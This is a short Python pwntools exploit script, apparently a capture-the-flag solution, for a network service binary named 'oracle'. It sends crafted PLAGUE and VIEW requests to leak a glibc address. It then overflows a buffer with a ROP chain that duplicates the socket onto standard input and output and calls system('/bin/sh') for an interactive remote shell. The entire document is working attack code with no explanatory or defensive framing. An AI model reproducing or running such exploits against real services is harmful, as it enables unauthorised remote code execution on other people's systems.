#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = 'oracle'
glibc = ELF('libc.so.6', checksec=False)

host, port = sys.argv[1].split(':')


io = remote(host, port)
io.send(b'PLAGUE asdf 1337\r\nContent-Length: 256\r\nPlague-Target: asdf\r\n\r\n' + b'A' * 0x100 + b'\r\n')
io.recv()
io.close()


io = remote(host, port)
io.send(b'PLAGUE asdf 1337\r\nContent-Length: 256\r\n\r\n' + b'A' + b'\r\n')
io.recvuntil(b'Attempted plague: ')
glibc.address = u64(io.recvn(16)[8:]) - 0x1ecbe0
io.success(f'Glibc base address: {hex(glibc.address)}')
io.close()


socket_fd = 6

pop_rdi_ret_addr = glibc.address + 0x23b6a
pop_rsi_ret_addr = glibc.address + 0x2601f

payload  = b'A' * 2127

for fd in [0, 1, 2]:
    payload += p64(pop_rdi_ret_addr)
    payload += p64(socket_fd)
    payload += p64(pop_rsi_ret_addr)
    payload += p64(fd)
    payload += p64(glibc.sym.dup2)

payload += p64(pop_rdi_ret_addr)
payload += p64(next(glibc.search(b'/bin/sh')))
payload += p64(glibc.sym.system)


io = remote(host, port)
io.send(b'VIEW asdf 1337\r\n' + payload + b'\r\n\r\n')
io.recv()
io.interactive()
